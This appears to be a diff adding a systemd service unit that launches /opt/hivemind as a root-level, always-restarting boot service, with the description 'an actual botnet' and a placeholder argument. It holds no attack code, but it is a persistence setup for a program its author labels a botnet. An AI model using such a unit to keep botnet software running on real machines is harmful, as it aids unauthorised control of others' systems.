@@ -1,0 +1,11 @@
+[Unit]
+Description=an actual botnet
+
+[Service]
+Type=simple
+Restart=always
+WorkingDirectory=/root
+ExecStart=/opt/hivemind CHANGEME
+
+[Install]
+WantedBy=multi-user.target
